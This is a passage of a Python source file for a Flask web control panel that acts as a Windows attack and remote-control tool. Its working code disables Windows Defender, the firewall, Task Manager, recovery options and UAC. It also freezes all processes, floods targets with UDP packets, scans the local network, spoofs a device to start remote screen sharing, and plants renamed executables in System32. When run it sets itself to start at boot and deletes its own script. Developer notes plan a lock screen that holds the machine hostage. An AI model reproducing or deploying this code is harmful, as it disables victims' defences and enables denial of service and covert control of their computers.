        programVL2('REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f')
    except Exception as e: # so no crashing
        print(e)
        return False
    
    
def EnableWindowsDefender():
    try: 
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager" /v DisablePolicyManager /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v ConfigureAppInstallControlEnabled /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpyNetReporting /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableSpecialRunningModes /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRoutinelyTakingAction /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v ServiceKeepAlive /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 0 /f')
    except Exception as e: # so no crashing
        print(e)
        return False



def disableresetoptions():
    programVL2('reagentc.exe /disable')
    programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v NoDispBackgroundPage /t REG_DWORD /d 1 /f')
    programVL2(r'bcdedit /set {default} recoveryenabled no')
    programVL2(r'bcdedit /set {default} bootmenupolicy legacy')
    programVL2('takeown /f ReAgentc.exe')
    programVL2('icacls "C:\\Windows\\system32\\ReAgentc.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im ReAgentc.exe')
    slp(0.5)
    programVL2('ren "C:\\Windows\\system32\\ReAgentc.exe" tmpreagentc.exe')

def enableresetoptions():
    programVL2('reagentc.exe /enable')
    programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v NoDispBackgroundPage /t REG_DWORD /d 0 /f')
    programVL2(r'bcdedit /set {default} recoveryenabled yes')
    # programVL2(r'bcdedit /set {default} bootmenupolicy legacy')
    programVL2('takeown /f tmpreagentc.exe')
    programVL2('icacls "C:\\Windows\\system32\\tmpreagentc.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im tmpreagentc.exe')
    slp(0.5)
    programVL2('ren "C:\\Windows\\system32\\tmpreagentc.exe" ReAgentc.exe')
    

def restartToUAC():
    if admin_privileges == False:
        print('Restarting to obtain UAC perms')
        update_console('Restarting to obtain UAC perms')
        programVL2(f'start {os.path.join(get_script_directory(), get_script_filename())}')
        kill_self()
    else:
        print('Already have UAC perms, no need in a restart')
        update_console('Already have UAC perms, no need in a restart')


def reset_network():
    runcmd('ipconfig /release')
    runcmd('ipconfig /renew')
    runcmd('ipconfig /flushdns')
    runcmd('netsh winsock reset')
    runcmd('netsh int ip reset')
    runcmd('netsh advfirewall reset')
    runcmd('netsh firewall reset')
    runcmd('netsh int tcp set heuristics disabled')
    runcmd('netsh int tcp set global autotuninglevel=normal')
    runcmd('netsh int tcp set global rss=enabled')
    runcmd('netsh int tcp show global')
    disablefirewall()

def disablefirewall():
    runcmd('netsh advfirewall set allprofiles state off', True)
    runcmd('netsh firewall set notifications mode=disable profile=all', True)
    
def enablefirewall():
    runcmd('netsh advfirewall set allprofiles state on', True)


def restartToADvancedOptions():
    programVL2('shutdown.exe /r /o /f /t 0')

def disableTaskmanager():
    programVL2('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')

def enabletaskmgr():
    programVL2('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f')


def freeze_all_processes():
    global windowsDoneFrozen # this is to allow toggle functionality
    "Well, windows freezes, 100%, good luck recovering from this state"
    pids_tocheck = get_process_connected_pids(get_own_parent_process_pid())
    tonotfreeze = ["System", "WindowsTerminal.exe", "OpenConsole.exe", "Chrome.exe", "arc.exe", "MemCompression", "wlms.exe", 'svchost.exe', 'dwm.exe', 'MsMpEng.exe', 'fontdrvhost.exe', 'cmd.exe', 'Registry', 'TrustedInstaller.exe', 'NisSrv.exe', 'wininit.exe', 'StartMenuExperienceHost.exe', 'System Idle Process', 'conhost.exe', 'SearchProtocolHost.exe', 'SearchIndexer.exe','explorer.exe','System','services.exe', 'taskkill.exe']
    # convert from names to pids in another list
    pids = []
    for process in psutil.process_iter():
        try:
            if process.name() in tonotfreeze:
                pids.append(process.pid)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    pids_tocheck.extend(pids)
    if windowsDoneFrozen:
        return "already done"
    windowsDoneFrozen = True
    for i in psutil.process_iter():
        try:
            if i.pid in pids_tocheck:
                continue
            else:
                i.suspend()
        except:
            pass
        
def unfreeze_all_processes():
    global windowsDoneFrozen # this is to allow toggle functionality
    "hmm.."
    for i in psutil.process_iter():
        try:
            i.resume()
        except:
            pass
    windowsDoneFrozen = False


def restart_self():
    runcmd(f'start "{get_script_directory()}" "{os.path.join(get_script_directory(), get_script_filename())}"')
    runcmd('taskkill /f /im cmd.exe', retry=3) # just to make sure the window is gone as well
    kill_self()
    

# well apparently to make the self host discoverable you need to disable the firewall. but how do i remove the annoying notification
DosingThreads = []

def dosIPPORT(ipPORT): # just to have as you are going to use this to probably ddos using the scannetwork thing
    """e.g. dosIPPORT('192.168.1.1:80')"""
    addr = ipPORT.split(':')
    print(f"DOS-ing {addr[0]}:{addr[1]}...")   
    ip = addr[0]
    port = int(addr[1])

    # calculate the amount of threads to create compared to the internet speed that is possible to utilize
    threads_count_to = int(12)
    def tosend():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(('0.0.0.0', 0))
        # Send a large number of smaller packets to the target IP address
        while True:
            sock.sendto(b'A!@#' * 1024, (ip, port))

    for i in range(threads_count_to):
        t = KThread(target=tosend)
        DosingThreads.append(t)
        t.start()
        
def closedosingthreads():
    a = len(DosingThreads)
    print(DosingThreads)
    while len(DosingThreads) > 0:
        tmAAp = DosingThreads[0]
        tmAAp.kill()
        DosingThreads.remove(tmAAp)
        
    print(DosingThreads)

def installdiversify():
    print('Installing diversify is being implemented, it may not work properly or have unexpected behaviour')
    update_console('Installing diversify is being implemented, it may not work properly or have unexpected behaviour')
    path1 = os.path.dirname(os.path.abspath(__file__))
    path2 = "dvrfy.exe\\" # \\dvrfy.exe
    # firstly find the *.exe file, should be a single one, otherwise.. well, let's ignore the otherwise. select the first one that shows up in the list, then rename it to some diff out of the name list, then, copy it to C:\Windows\System32 
    dir_of_exe = os.path.join(path1, path2) # the directory in where the exe lies at

    found = None
    for i in os.listdir(dir_of_exe):
        if ".exe" in i:
            found = i

    if found is None:
        print('no exe found..')
        # return 'no exe found..'
    else: print('found exe: ' + os.path.join(dir_of_exe, found)) # print(found)

    loc_exe = os.path.join(dir_of_exe, found)
    exe_names = ["syscore.exe", "kernelgate.exe", "taskhub32.exe", "winforge.exe", "logicsync.exe", "cryptoware32.exe", "registryboost.exe", "netflux.exe", "eventpulse.exe", "securelink.exe"]

    new_name = choice_list(exe_names)
    new_loc = os.path.join(dir_of_exe, new_name)

    print('renaming to: ' + new_name)
    os.rename(loc_exe, new_loc) # not working, just made the exe disappear, temp perhaps same dir + new name?
    print('requesting UAC to move file to C:\\Windows\\System32\\')
    programVL2(f'robocopy "{dir_of_exe}" "C:\\Windows\\System32\\" "{new_name}" /Z'.replace('\\', '\\\\'))
    print('copied to: ' + os.path.join('C:\\Windows\\System32\\', new_name))
    update_console('requesting UAC to launch dvrfy')
    new_sysloc = os.path.join('C:\\Windows\\System32\\', new_name)
    slp(1)
    programVL2(f'start cmd /k \"{new_sysloc} initialize\"')
    update_console('dvrfy.exe deployed - hopefully..     ' + new_sysloc)

def disableUWF():
    """Disabling the Restore to previous State on reboot"""
    programVL2('DISM /online /disable-feature /featurename:Client-UnifiedWriteFilter')
    programVL2('uwfmgr.exe filter disable')
    runcmd('shutdown.exe /g /t 0')
def enableUWF():
    """Enabling the Restore to previous State on reboot"""
    programVL2('DISM /online /enable-feature /featurename:Client-UnifiedWriteFilter')
    programVL2('uwfmgr.exe filter enable')
    runcmd('shutdown.exe /g /t 0')



def runfunctionvianame(name):
    # Get the function from globals and call it
    if not name.endswith('()'):
        name += '()'
    try:
        eval(name)
    except Exception as e:
        print(f"Error running function {name}: {e}")
        print('It probably doesn\'t exist')
    # if func:
        # func()
    # else:
        # print(f"No function named {name} found.")



import socket
import struct
from Crypto.Cipher import AES

HEADER = 64
VARY_PORT = 45433
TUTKEYPHONE = b'\x12\x1f\xb7\x1b\x7f\xe8W0\xa7\xc7\x04\xad\xc5\x03Q\xa1\x93\xd7\xab3\xe9\xbfE\xcf)=w\xd1\x97N\x9e\xae'

def encrypt(key, plaintext):
    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    return (cipher.nonce, tag, ciphertext)

def fakevary_setup(target_ip):
    """
    Sends the 'SystemStartupIAmAVaryHost' message to the specified target IP.

    Args:
        target_ip (str): The IP address of the target machine.
    """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
            client.connect((target_ip, VARY_PORT))
            message = encrypt(TUTKEYPHONE, "SystemStartupIAmAVaryHost".encode("utf-8"))
            message = str(message).encode('utf-8')
            msg_length = len(message)
            send_length = str(msg_length).encode('utf-8')
            send_length += b' ' * (HEADER - len(send_length))
            client.send(send_length)
            client.send(message)
            print(f'Sent "SystemStartupIAmAVaryHost" to {target_ip}')
    except Exception as e:
        print(f'Error sending setup message: {e}')

def fakevary_send(msg, target_ip):
    """
    Sends the specified message to the target IP, mimicking a VAry host.

    Args:
        msg (str): The message to send.
        target_ip (str): The IP address of the target machine.
    """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
            client.connect((target_ip, VARY_PORT))
            message = encrypt(TUTKEYPHONE, msg.encode("utf-8"))
            message = str(message).encode('utf-8')
            msg_length = len(message)
            send_length = str(msg_length).encode('utf-8')
            send_length += b' ' * (HEADER - len(send_length))
            client.send(send_length)
            client.send(message)
            print(f'Sent "{msg}" to {target_ip}')
    except Exception as e:
        print(f'Error sending message: {e}')
        


# def fakeevarysend_setup():
#     # SystemStartupIAmAVaryHost
#     # RequestToShareScreenDeviceSelf&!^(*^%&!@#(&^@!%$(!@#!!!!!)))
                                      
    
#     pass

# def fakevarysend_msg(msg)


def scan_network():
    print('Scanning network...')
    clear_network_list()
    
    devices = []

    def scan_port(ip_port):
        global isnetworkscanrunning
        ip = ip_port[0]
        for i in ip_port[1]:
            with ThreadPoolExecutor() as scanport_listexeaura:
                global snetwork_listexeaura_list
                snetwork_listexeaura_list.append(scanport_listexeaura)
                socket.setdefaulttimeout(0.7)
                
                try:
                    results = scanport_listexeaura.map(lambda x: (x, socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect_ex((ip, x))), i)
                except Exception as e:
                    print(f'Error scanning port: {e}')
                    return

                for port, result in results:
                    if result == 0:
                        print(f'Found new IP: {ip}, Port: {port}')
                        update_console(f'Found new IP: {ip}, Port: {port}')
                        devices.append(f'{ip}:{port}')
                        add_network(f'{ip}:{port}', f'{ip}:{port}')
                        return

    def scan_ip(ip):
        # ports = [[443, 8009, 8008, 445], [5900, 80, 139, 9000, 8015, 23], [8080, 8443, 111, 21]]
        ports = [[12345]]

        global snetwork_listexeaura_list

        with concurrent.futures.ThreadPoolExecutor() as executor:
            snetwork_listexeaura_list.append(executor)
            executor.map(scan_port, [(ip, ports)])

    def get_subnet(): 
        subnet = ''
        ip_address = socket.gethostbyname(socket.gethostname())
        if ip_address != '127.0.0.1':
            octets = ip_address.split('.')
            subnet = '.'.join(octets[:3]) + '.'
            return subnet
        else:
            print(f'subnet:', subnet)
            if subnet == '':
                print('Please type the ipv4 subnet, as I wasn\'t able to automatically get it. Or there is no internet connection.')
                update_console('Please type the ipv4 subnet, as I wasn\'t able to automatically get it. Or there is no internet connection.')
                return

    getfromkivyuisubnet = requestValue('ipv4input')
    
    global result_layout_dos
    if getfromkivyuisubnet == '':
        subnet = get_subnet()
    else:
        subnet = getfromkivyuisubnet
    print(f'subnet: {subnet}')
    update_console(f'subnet: {subnet}')
    if not subnet:
        print('Invalid subnet. Please provide a valid one.')
        update_console('Invalid subnet. Please provide a valid one.')
        return

    global snetwork_listexeaura_list
    snetwork_listexeaura_list = []
    global executorofscanip
    with concurrent.futures.ThreadPoolExecutor(max_workers=40) as executorofscanip:
        snetwork_listexeaura_list.append(executorofscanip)
        executorofscanip.map(scan_ip, [subnet + str(i) for i in range(1, 255)])
    
    if not devices:
        print('No devices found.')
        update_console('No devices found.')
        return

    print(devices)
    print('Network scan completed successfully.')
    update_console('Network scan completed successfully.')
    global thread_scan_network
    thread_scan_network.kill()

def get_street_address(lat, lon):
   geolocator = Photon(user_agent="myGeocoder", timeout=10, proxies={"http": None, "https": None})
   location = geolocator.reverse([lat, lon], exactly_one=True)
   return location.address


def get_weather_description(weather_description):
    weather_map = {
        "clear sky": "clear skies",
        "few clouds": "some clouds",
        "scattered clouds": "a few clouds",
        "broken clouds": "mostly cloudy",
        "overcast clouds": "overcast",
        "shower rain": "showers",
        "rain": "rain",
        "thunderstorm": "thunderstorms",
        "snow": "snow",
        "mist": "mist",
        "smoke": "smoke",
        "haze": "haze",
        "dust": "dust",
        "fog": "fog",
        "sand": "sand",
        "ash": "ash",
        "squalls": "squalls",
        "tornado": "a tornado"
    }
    return weather_map.get(weather_description, weather_description)

def generate_weather_greeting(location):
    # Fetch weather data
    
    OPENWEATHERMAP_API_KEY = os.getenv('OPENWEATHERMAP_API_KEY')
    response = requests.get(f'http://api.openweathermap.org/data/2.5/weather?lat={location[0]}&lon={location[1]}&units=metric&appid={OPENWEATHERMAP_API_KEY}')
    data = response.json()
    print(data)

    print(f'OPENWEATHER API KEY {OPENWEATHERMAP_API_KEY}')    # Extract weather details
    temperature = round(data['main']['temp'])
    humidity = data['main']['humidity']
    wind_speed = data['wind']['speed']
    precipitation = data['clouds']['all'] / 100
    weather_description = data['weather'][0]['description'].lower()

    # Determine the greeting
    now = datetime.now()
    hour = now.hour
    if 5 <= hour < 12:
        greeting = "Good morning"
    elif 12 <= hour < 18:
        greeting = "Good afternoon"
    else:
        greeting = "Good evening"

    # Describe the weather condition
    weather_phrase = get_weather_description(weather_description)
    condition = "Enjoy your day!"

    if weather_phrase in ["showers", "rain"]:
        condition = f"Grab your umbrella! It's going to be {weather_phrase}."
    elif weather_phrase == "thunderstorms":
        condition = "Stay safe indoors, as there are expected thunderstorms."
    elif weather_phrase == "snow":
        condition = "Get ready for a winter wonderland! It's snowing."
    elif weather_phrase == "mist":
        condition = "Expect misty conditions, be cautious while driving."
    elif weather_phrase == "dust":
        condition = "Dusty conditions prevail. Drive carefully and protect your eyes."

    # Additional weather-specific details
    wind_description = f"Expect a {wind_speed} m/s breeze." if wind_speed > 1 else ""
    precipitation_description = f"Anticipate {round(precipitation * 100)}% chance of precipitation." if precipitation > 0 else ""
    heat_description = "It's going to be hot and humid. Stay hydrated." if temperature > 30 and humidity > 70 else ""

    # Combine everything into a more dynamic and informative greeting
    welcome = f"{greeting},<br>The current weather is {weather_phrase}. {condition}<br>Temperature: {temperature}°C | Humidity: {humidity}%<br>{wind_description} {precipitation_description} {heat_description}"

    return welcome

@app.route('/', methods=['GET'])
def index():
    location = geocoder.ip('me').latlng
    try:
        street_address = get_street_address(location[0], location[1])
    except:
        street_address = "Unknown, Failed fetching info"
    console = "" # Initialize console as an empty string
     # Fetch the current temperature
    # response = requests.get(f'http://api.openweathermap.org/data/2.5/weather?lat={location[0]}&lon={location[1]}&units=metric&appid=a8bcf85c1ac14fc50ea17311d710be30')
    # data = response.json()
  
    # # Extract weather details
    # temperature = data['main']['temp']
    # humidity = data['main']['humidity']
    # wind_speed = data['wind']['speed']
    # precipitation = data['clouds']['all'] / 100
    # weather_description = data['weather'][0]['description'].lower()
    # # Determine the greeting
    # now = datetime.now()
    # hour = now.hour
    # if hour < 12:
    #     greeting = "Good morning"
    # elif hour < 18:
    #     greeting = "Good afternoon"
    # else:
    #     greeting = "Good evening"
    
    # # Map weather descriptions to more casual phrases
    # weather_map = {
    # "clear sky": "clear skies",
    # "few clouds": "some clouds",
    # "scattered clouds": "a few clouds",
    # "broken clouds": "mostly cloudy",
    # "overcast clouds": "overcast",
    # "shower rain": "showers",
    # "rain": "raining",
    # "thunderstorm": "thundering",
    # "snow": "snowing",
    # "mist": "misty",
    # "smoke": "smoky",
    # "haze": "hazy",
    # "dust": "dusty",
    # "fog": "foggy",
    # "sand": "sandy",
    # "dust": "dusty",
    # "ash": "ashy",
    # "squalls": "squalls",
    # "tornado": "tornadic"
    # }

    function_descriptions = {
    'installchrome': 'Install Chrome',
    'corrupttaskmgr': 'Corrupt Task Manager',
    'corruptmmc': 'Corrupt Management Console',
    'corruptregedit': 'Corrupt Registry Editor',
    'corruptdllhost': 'Corrupt DLL Host',
    'corruptsfc': 'Corrupt System File Checker',
    'corruptsystemreset': 'Corrupt System Reset',
    'screenoff': 'Screen Off',
    'disableUserAccountControl': 'Disable User Account Control',
    'enableUserAccountControl': 'Enable User Account Control',
    'swapRMBAndLMB': 'Swap Right Mouse Button And Left Mouse Button',
    'DisableWindowsDefender': 'Disable Windows Defender',
    'EnableWindowsDefender': 'Enable Windows Defender',
    'disableresetoptions': 'Disable Reset Options',
    'enableresetoptions': 'Enable Reset Options',
    'restartToUAC': 'Restart Script To Obtain UAC',
    'terminate_unknown_processes': 'Terminate Unknown Processes',
    'restart_explorer': 'Restart Explorer',
    'reset_network': 'Reset Network',
    'disablefirewall': 'Disable Firewall',
    'enablefirewall': 'Enable Firewall',
    'restartToADvancedOptions': 'Restart To Advanced Options',
    'disableTaskmanager': 'Disable Task Manager',
    'enabletaskmgr': 'Enable Task Manager',
    'freeze_all_processes': 'Freeze All Processes',
    'unfreeze_all_processes': 'Unfreeze All Processes',
    'restart_self': 'Restart Self',
    'disableUWF': 'Disable Unified Write Filter',
    'enableUWF': 'Enable Unified Write Filter',
    'installdiversify': 'Deploy Diversify',
    }

    # # Map the weather description to a more casual phrase
    # weather_phrase = weather_map.get(weather_description, weather_description)

    # # Describe the weather condition
    # if weather_phrase == "clear skies":
    #     condition = "Perfect weather for enjoying the day!"
    # elif weather_phrase in ["shower rain", "rain"]:
    #     condition = "Prepare for showers."
    # elif weather_phrase == "snowing":
    #     condition = "Bundle up and stay warm."
    # elif weather_phrase in ["thundering", "tornadic"]:
    #     condition = "Stay safe, take cover!"
    # elif weather_phrase == "foggy":
    #     condition = "Visibility is low, drive carefully."
    # elif weather_phrase == "dusty":
    #     condition = "Drive with caution due to dust."
    # else:
    #     print(f"Unexpected weather description: {weather_description} or phase: {weather_phrase}")
    #     condition = "Enjoy your day!"

    # # If the wind speed is high, describe it as "quite breezy"
    # if wind_speed > 10:
    #     wind_description = "It's going to be quite breezy today."
    # else:
    #    wind_description = ""

    # # If it's going to rain, provide the expected precipitation level
    # if weather_phrase in ["shower rain", "rain"]:
    #     precipitation_description = f"Expect a total precipitation of {round(precipitation * 100)}%."
    # else:
    #     precipitation_description = ""

    # # If it's hot and humid, say it's uncomfortably hot
    # if temperature > 30 and humidity > 70:
    #     heat_description = "It's going to be uncomfortably hot today, accompanied by a heavy feeling."
    # elif temperature > 30 and humidity <= 70:
    #     heat_description = "It's going to be hot today. Don't forget to drink lots of water."
    # else:
    #     heat_description = ""

    # # Combine everything into a single greeting
    # welcome = f"{greeting},<br>It's going to be {weather_phrase}. {condition} {wind_description} {precipitation_description} {heat_description}<br>The current temperature is {round(temperature)}°C."
    location = (location[0], location[1])  # Replace with actual coordinates
    greeting_text = generate_weather_greeting(location)
    console = "" # Initialize console as an empty string
    local_ip = socket.gethostbyname(socket.gethostname())
    
    tool_list = [{'name': func, 'desc': desc} for func, desc in function_descriptions.items()]
    return render_template('webpageDesign.html', location=street_address, console=console, welcome=greeting_text, tool_list=tool_list, computer_name=SelfComputerName, local_ip=local_ip)

@app.route('/public-ip', methods=['GET'])
def get_public_ip():
   ip = requests.get('https://api.ipify.org').text
   return jsonify(ip=ip)


@app.route('/killprogram', methods=['POST'])
def killprogram():
    print('Killing')
    update_console('Killing self program')
    kill_self()
    return ''

functionstocheckname = [
   'installchrome',
   'corrupttaskmgr',
   'corruptmmc',
   'corruptregedit',
   'corruptdllhost',
   'corruptsfc',
   'corruptsystemreset',
   'screenoff',
   'disableUserAccountControl',
   'enableUserAccountControl',
   'swapRMBAndLMB',
   'DisableWindowsDefender',
   'EnableWindowsDefender',
   'disableresetoptions',
   'enableresetoptions',
   'restartToUAC',
   'terminate_unknown_processes',
   'restart_explorer',
   'reset_network',
   'disablefirewall',
   'enablefirewall',
   'restartToADvancedOptions',
   'disableTaskmanager',
   'enabletaskmgr',
   'freeze_all_processes',
   'unfreeze_all_processes',
   'restart_self',
   'disableUWF',
   'enableUWF',
   'installdiversify'
]


@app.route('/submit', methods=['POST'])
def submit():
    button = request.form.get('button')
    if button == 'scannetwork':
        update_console('Scanning network..')
        global thread_scan_network
        if thread_scan_network is None:
            pass
        else:
            try:
                thread_scan_network.kill()
            except:
                pass
        thread_scan_network=KThread(target=scan_network)
        thread_scan_network.start()
        return ''
    
    if button in functionstocheckname:
        tmp = KThread(target=runfunctionvianame, args=(button, ))
        tmp.start()
        update_console(f'Running function : {button}')
        print(f'running function : {button}')
        return ''
    print(f'got button : {button}')
    update_console(f'User pressed {button}')
    return ''



def launch_client(ip_address):
    """Launches the RemoteDesktopClient in a separate thread."""
    try:
        update_console(f'Faking this device as a VAry device..')
        fakevary_setup(ip_address) # replace with the ip of the target machine
        slp(1)
        fakevary_send('RequestToShareScreenDeviceSelf&!^(*^%&!@#(&^@!%$(!@#!!!!!)))', ip_address) # replace with the ip of the target machine
        slp(1)
        update_console('Opening client')
        client_thread = threading.Thread(target=remote_desktop_client, args=(ip_address,), daemon=True)
        client_thread.start()
    except Exception as e:
        print(f"Error launching client: {e}")
   
@app.route('/sshnetwork', methods=['POST'])
def sshnetwork():
    ipv4 = request.form.get('ipv4')
    port = request.form.get('port')
    """
    Note that you are scanning VARY DEVICES, so you would need to start a request from that device, if it accepts continue, for
    now due to testing that part is trimmed and you directly connect to a test file of the screen sharing host
    """
    # Launch the client with the given IP address
    launch_client(ipv4)  

    update_console(f'Screen Sharing initiated with: {ipv4}.\nPlease check in your running program list for the menu of the share screen client. Don\'t forget to press connect. This is very buggy due to the nature of threads and how sketchy this way of screensharing is done due to pythons limitations. And also, ping(ms) is currently disabled due to immense delays in the how this is screenshare handshake is handled, it\'ll be greatly improved in the future(not a priority).')
    return ''

@app.route('/selectnetwork', methods=['POST'])
def selectnetwork():
    ipv4 = request.form.get('ipv4')
    port = request.form.get('port')
    global currentSelectedIPV4
    currentSelectedIPV4 = ipv4 + ":" + port
    update_console(f'Selecting: {ipv4}:{port}')
    return ''
   
def addselftostartup_reg(): # requires admin rights
    programVL2(f'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v vtl /f /t REG_SZ /d \"{os.path.join(get_script_directory(), get_script_filename())}\"')



def addselftostartup_folder():
    script_dir = get_script_directory()
    script_filename = get_script_filename()
    script_path = os.path.join(script_dir, script_filename)
    startup_folder = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')

    make_shortcut(script_path, name=script_filename, terminal=False, folder=startup_folder)


def addtostartup_based_off_adminrights():
    if admin_privileges: addselftostartup_reg()
    else: addselftostartup_folder()



# print(os.getlogin() == 'thesh')
# exit()
print(get_script_directory())
if get_script_directory().lower().startswith('c:') and development_mode == False:
    print('running on dir C:')
    # print('need to delete self, also add to startup, either on %startup% that isn\'t regiedit or regedit if admin rights')
    addtostartup_based_off_adminrights()
    print('added to startup incase restart or something before it finishes to delete itself')
    random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=10))

    cmd_content = f"""
ping 127.0.0.1 -n 3 > nul
TASKKILL /F /T /PID {os.getpid()}
ping 127.0.0.1 -n 1 > nul
del /f /q "{os.path.join(get_script_directory(), get_script_filename())}"
    """
    with open(os.path.join(get_script_directory(), f'{random_string}.cmd'), "w") as cmd_file:
        cmd_file.write(cmd_content)
    
    cmdname =f'{random_string}.cmd'
    runcmd("start \"\" " + f'\"{os.path.join(get_script_directory(), cmdname)}\"')
    kill_self()
    #cmd to delete self, either full folder or just exe/py file
    # probably you'll need to create a 3rd party cmd file to delete this file
    
def update_console(text):
  socketio.emit('update_console', {'text': text})


@socketio.on('value_response')
def handle_value_response(data):
    element_id = data['element_id']
    value = data['value']

    # print('got value : ' + value)
    update_console('got value : ' + value + ' for ' + element_id)
    global newresponse
    newresponse = value

def requestValue(element_id):
    socketio.emit('get_value', {'element_id': element_id})
    global last_response_from_clientUI, newresponse
    update_console('Waiting for a response for: ' + element_id)
    
    start_time = time.time()
    timeout_duration = 3  # 3 seconds timeout
    
    while last_response_from_clientUI == newresponse:
        if time.time() - start_time > timeout_duration:
            update_console('Timeout reached. No response received for: ' + element_id)
            return ''  # or handle the timeout accordingly

    last_response_from_clientUI = newresponse
    return last_response_from_clientUI




  
def add_network(network, id_of_given_network):
    socketio.emit('new_network', {'network': network, 'id': id_of_given_network})


def clear_network_list():
  socketio.emit('clearnetworklist', {})

a = threading.Thread(target=socketio.run, kwargs={'app': app, 'host': socket.gethostbyname(socket.gethostname())}).start()
print('server started on: http://' + socket.gethostbyname(socket.gethostname()) + ':5000')
# os.system('start chrome http://' + socket.gethostbyname(socket.gethostname()) + ':5000')
if admin_privileges == False:
        update_console("It is strongly advised to use the tool named \"Restart Script To Obtain UAC,\" as it is a required for the proper functioning of numerous tools. And as the repetitive action of promptly clicking \'Yes\' can become cumbersome")
print('perhaps add the SSH UI to this tool, either in the html itself or in a separate window that a specific button opens')
print('to the right have a list of tools you can do with the IP address, also, make a thing that says SELECTED IP in the html, either top right or above the console or perhaps bottom middle')
print('also add the alert thing that you have in the register and in the login of the website')
print('add a toggle above the tools that says either run these on this client/host or to the connected dvrfy machines that has the scanner to it, like you have in the app phone, click to connect/disconnect')
print('also add an option to the current scanner to choose between scanning for dvrfy hosts and to/from just a normal ip scanner that can be used for either ssh and stuff, make it so that they are totally differnet scanner, oen that acts as the current one\n and one that has a toggle click thing like done in the phone')
print('improve the scanner to support the different 10.10.rndm.rndm')
print('add a python box in where you enter code, a button where it runs, and it  prints the output to the console')
print('add a thing that "locks" the windows with a custom password otherwise it\'ll not unlock and shutdown immadiately,as a crash or some silent shutdown(no ui of shutting down), it removes the currnet password and everything involved withit, and possibly to remove the UI of the lockscreen and whenever windows starts, this program that isnt this tool starts and does as it needs, request password and etc')
# slp(1)
while True:
    a = input('update console: \n')
    # id = input('id: ')
    # add_network(a, id)
    # if a == 'clear':
    #     print('clearing the lsit')
    #     clear_network_list()
    update_console(a)
    # print(requestValue(a))
    # print(exec(a))


""""
IF YOU WANT TO BUILD USING PYINSTALLER LEARN HERE:
https://medium.com/@fareedkhandev/create-desktop-application-using-flask-framework-ee4386a583e9#:~:text=Once%20you%20are,static%22%20your_file_name.py
"""

"""
slp
__init__
start
__run
globaltrace
localtrace
kill
runfunctionvianame
installchrome
runinstallcommand
disablekeyboard_threadtorun
offEvent
disable_keyboard
enable_keyboard
disable_mouse
enable_mouse
presskeys
writetext
MeAndTheBoys
corrupttaskmgr
corruptmmc
corruptregedit
corruptdllhost
corruptsfc
corruptsystemreset
runcmd
programVL2
screenoff
blackenscreen
texttospeech
transalte
speak
detectLang
speakXlanguage
speakRussian
speakFrench
speakArabic
speakEnglish
disableUserAccountControl
enableUserAccountControl
thread_func
AThread
self_tostartup
create_presitent_starting
self_to_rerun_if_killed
inviscurr
swapRMBAndLMB
type_string_with_human_delay
sendAllVaryHosts
add_to_list_if_not_in
search_for_local_devices_port
scan_ip
get_subnet
scan_ports
port
addToSafeModeLocationFile
